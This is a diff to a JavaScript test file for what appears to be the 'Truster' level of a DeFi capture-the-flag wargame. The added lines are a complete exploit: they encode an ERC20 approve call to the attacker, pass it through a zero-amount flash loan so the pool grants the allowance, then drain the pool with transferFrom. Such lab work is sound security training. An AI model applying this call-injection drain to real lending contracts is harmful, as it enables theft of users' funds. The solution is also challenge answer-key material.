@@ -25,10 +25,18 @@ describe('[Challenge] Truster', function () {
         expect(
             await this.token.balanceOf(attacker.address)
         ).to.equal('0');
+        // this.attackcalldata = abi.encodeWithSignature("approve(address,uint256)",attacker.address,TOKENS_IN_POOL)
+        this.attackcalldata = this.token.interface.encodeFunctionData("approve",[attacker.address,TOKENS_IN_POOL])
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        await this.pool.connect(attacker).flashLoan("0",attacker.address,this.token.address,this.attackcalldata);
+        console.log( (await this.token.balanceOf(attacker.address)).toString());
+        console.log(attacker.address);
+        console.log(await this.token.allowance(this.pool.address,attacker.address)); 
+        await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);
+        console.log(attacker.address);
     });
 
     after(async function () {
